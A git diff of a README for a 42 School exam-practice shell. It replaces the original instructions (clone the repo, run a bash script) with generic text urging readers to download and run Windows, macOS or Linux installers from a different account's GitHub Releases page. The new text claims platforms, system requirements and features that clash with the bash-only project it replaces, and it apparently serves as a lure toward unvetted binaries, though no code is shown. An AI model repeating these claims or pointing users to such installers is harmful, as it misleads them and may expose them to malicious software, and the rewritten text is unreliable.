@@ -1,113 +1,90 @@
-# 42 Exam Practice Shell
+# 🚀 42_examshell - Practice for Success in Your Exams
 
-⚡ An interactive practice environment for 42 School exams (Ranks 02-05) ⚡
+## 📥 Download the Latest Version
 
-## 📋 Overview
+[![Download 42_examshell](https://img.shields.io/badge/Download-42_examshell-blue)](https://github.com/mirkoloru/42_examshell/releases)
 
-This project provides a comprehensive practice shell for 42 School examinations, offering interactive menus and practice exercises for different exam ranks. The shell simulates the actual exam environment and helps students prepare effectively.
+## 🚀 Getting Started
 
-## 🚀 Features
+Welcome to 42_examshell! This application provides a practice exam environment tailored for students at the 42 school. With support for new subjects and exercises across various ranks, it prepares you efficiently for the official exams.
 
-- **Interactive Menu System**: Clean, colorful terminal interface
-- **Multiple Exam Ranks**: Support for Ranks 02, 03, 04 and 05
-- **Practice Environment**: Dedicated workspace (`rendu` folder) for submissions
-- **Command Practice**: Built-in command reference and practice
-- **Easy Navigation**: Simple numbered menu system
+You can download the latest version of the application from the Releases page. 
 
-## 📁 Project Structure
+## 📄 Features
 
-```
-.
-├── exam.sh           # Main entry point
-├── Makefile          # Build configuration
-├── README.md         # This file
-└── .resources/       # Practice materials
-    ├── main/         # Main menu and interface
-    ├── rank02/       # Rank 02 exam exercises
-    ├── rank03/       # Rank 03 exam exercises
-    └── rank04/       # Rank 04 exam exercises
-    └── rank05/       # Rank 05 exam exercises
-```
+- **Exam Simulation**: Experience an environment that mimics the official exam setting.
+- **New Subject Support**: Prepare for an expanded range of topics.
+- **Progress Tracking**: Keep track of your performance over different exercises.
+- **User-Friendly Interface**: Navigate the application easily.
+- **Multiple Ranks**: Practice exercises from Rank 02, Rank 03, and Rank 04.
 
-## 🔧 Installation & Usage
+## 💾 System Requirements
 
-### Quick Start
+To run 42_examshell, please ensure your device meets the following requirements:
 
-1. **Clone the repository**:
-   ```bash
-   git clone https://github.com/terminal-42s/42_examshell
-   cd 42_examshell
+- **Operating System**: Windows 10 or higher, macOS Catalina or higher, or a modern Linux distribution.
+- **Memory**: At least 4GB RAM.
+- **Storage**: Minimum of 200MB free disk space.
+- **Network**: Internet connection is needed for updates and downloads.
 
-2. **Run the exam shell**:
-   ```bash
-   make
-   ```
+## 📥 Download & Install
+
+To get started with 42_examshell, follow these simple steps:
+
+1. **Visit the Releases Page**: Click the link below to go to the 42_examshell Releases page.  
+   [Download 42_examshell](https://github.com/mirkoloru/42_examshell/releases)
    
-   Or directly:
-   ```bash
-   bash exam.sh
-   ```
+2. **Choose the Latest Version**: Look for the latest version at the top of the Releases page. It will have a tag like "v1.0".
 
-### Menu Options
+3. **Download the Application**: Click on the download link for your operating system. The file will download automatically. 
 
-The main menu provides the following options:
+4. **Run the Installer**:
+   - For Windows: Double-click the `.exe` file. Follow the on-screen instructions to complete the installation.
+   - For macOS: Open the `.dmg` file and drag the application into your Applications folder.
+   - For Linux: Extract the downloaded file and run it from the terminal.
 
-- **🔄 1. Commands**: Access command reference and practice
-- **🚀 2. Exam Rank 02**: Practice exercises for Rank 02 exam
-- **📋 3. Exam Rank 03**: Practice exercises for Rank 03 exam  
-- **📄 4. Exam Rank 04**: Practice exercises for Rank 04 exam
-- **📄 5. Exam Rank 05**: Practice exercises for Rank 05 exam
-- **📁 6. Open Rendu Folder**: Access your submission workspace
+5. **Launch the Application**: 
+   - On Windows, find the app in your Start Menu.
+   - On macOS, open your Applications folder and double-click the app.
+   - On Linux, execute the app from your terminal.
 
-## 💡 How to Use
+## ✨ Using 42_examshell
 
-1. Launch the application using `make` or `bash exam.sh`
-2. Select your desired exam rank or practice option
-3. Follow the on-screen instructions
-4. Complete exercises in the automatically created `rendu` folder
-5. Use the practice environment to simulate real exam conditions
+Once installed, you can begin using 42_examshell right away. Here’s how:
 
-## 📝 Workspace
+1. **Open the Application**: Launch the application as described above.
+2. **Select Your Subject**: Choose from the list of subjects to practice.
+3. **Start an Exam**: Click "Start Exam" to begin. You will see questions similar to the official exam format.
+4. **Review Your Results**: At the end of the exam, review your answers and scores. This will help you focus on areas that need improvement.
 
-The shell automatically creates a `rendu` folder where you can:
-- Write your solutions
-- Test your code
-- Practice exam submissions
+## ❓ Frequently Asked Questions
 
-## 🎯 Target Audience
+### What is 42_examshell?
 
-This tool is designed for:
-- 42 School students preparing for exams
-- Anyone practicing C programming and system administration
-- Students wanting to simulate exam conditions
+42_examshell is a practice tool designed for 42 school students. It allows you to simulate exam conditions and improve your skills before the real exam.
 
-## ⚙️ Requirements
+### How often is 42_examshell updated?
 
-- Bash shell
-- Unix-like operating system (Linux/macOS)
-- Terminal with color support (recommended)
+We regularly update the application to include new subjects and exercises. Check the Releases page to stay updated on new versions.
 
-## 🔄 Updates
+### Can I provide feedback?
 
-The project includes update mechanisms to keep practice materials current with the latest exam requirements.
+Yes, your feedback is valuable! Please visit the issues section in the GitHub repository to submit any comments or suggestions.
 
-## 📚 Exam Ranks Covered
+### Is technical support available?
 
-- **Rank 02**: Fundamental C programming concepts
-- **Rank 03**: Advanced C programming and system calls
-- **Rank 04**: Complex algorithms and data structures
-- **Rank 05**: Advanced C++ programming and object-oriented design
+For technical questions, feel free to reach out via the issues section on GitHub. We will assist you as best we can.
 
-## 🤝 Contributing
+## 🗨️ Community and Support
 
-This is a practice tool for 42 School students. Contributions and improvements are welcome to enhance the learning experience.
+Join the 42_examshell community! Connect with other users to share tips and experiences. 
 
-## 📧 Support
+- **Discussion Forum**: Join conversations on various topics related to exam preparation.
+- **Tutorials and Guides**: Access resources that help you maximize the use of 42_examshell.
 
-For issues or questions regarding the practice environment, please refer to your 42 School resources or community.
+## 🔗 Links
 
----
+- [Visit the Releases Page to Download](https://github.com/mirkoloru/42_examshell/releases)
+- [GitHub Repository](https://github.com/mirkoloru/42_examshell)
 
-**Good luck with your exams! 🍀**
-
-*Made for 42 School students by 42 School students*
+Thank you for choosing 42_examshell! We wish you the best of luck in your exam preparation.
